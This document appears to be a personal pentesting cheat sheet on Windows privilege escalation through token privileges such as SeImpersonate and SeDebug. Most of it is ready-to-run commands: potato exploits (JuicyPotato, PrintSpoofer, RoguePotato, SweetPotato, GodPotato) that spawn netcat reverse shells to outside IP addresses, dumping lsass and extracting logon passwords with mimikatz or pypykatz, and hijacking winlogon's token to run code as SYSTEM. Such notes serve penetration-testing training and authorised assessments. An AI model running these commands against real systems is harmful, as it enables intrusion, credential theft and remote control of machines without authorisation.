---
tags:
  - Local
  - Privilege-Escalation
  - SeAssignPrimaryPrivilege
  - SeBackupPrivilege
  - SeCreateTokenPrivilege
  - SeDebugPrivilege
  - SeImpersonatePrivilege
  - SeLoadDriverPrivilege
  - SeRestorePrivilege
  - SeTakeOwnershipPrivilege
  - SeTcbPrivilege
  - AD
---
## identify
---
```batch
whoami /priv
```
Or sysinternals

[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
```powershell
accesschk.exe -p
```

## Exploit
---
#### SeImpersonate & SeAssignPrimaryToken
Windows Server 2016 and under: 
**JuicyPotato** [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.119 5555 -e cmd.exe" -t *
```
Windows Server 2019 and on:
**PrintSpoofer**: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
Spawn shell over new process *need stable shell*
```cmd
PrintSpoofer.exe -i -c cmd.exe
```
Spawn revshell
```cmd
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
**RoguePotato:** [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
```
RoguePotato.exe -r <IP> -e "C:\Windows\Tasks\nc.exe <IP> <port> -e cmd.exe" -l 9999
```
**SweetPotato**: [https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)
```cmd
SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <ENCODED REVSHELL>"
```
OR
```cmd
SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```
**GodPotato**: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
```cmd
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

#### SeDebug
___
**Dumping lsass**

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
or with task manager
![](../../../../../assets/Pasted%20image%2020250719100303.png)

read with mimikatz or pypykatz

```plaintext
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

```
pypykatz lsa minidump lsass.dmp
```

**Elevating to SYSTEM**

[https://github.com/decoder-it/psgetsystem](https://github.com/decoder-it/psgetsystem)

Using psgetsystem we can launch a child process that inherits the token of the parent process.


```
PS C:\tools> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

We can target the `winlogon.exe` service because its running as SYSTEM.

We can either 1. launch cmd.exe as SYSTEM if we have GUI access or 2. execute an exe to get a reverse shell, add ourselves to a group, or anything else.


```powershell
import-module .\psgetsys.ps1
ImpersonateFromParentPid -ppid 612 -command C:\Windows\Tasks\elev.exe
```

that process will launch with the integrity of the parent. (Hopefully SYSTEM)
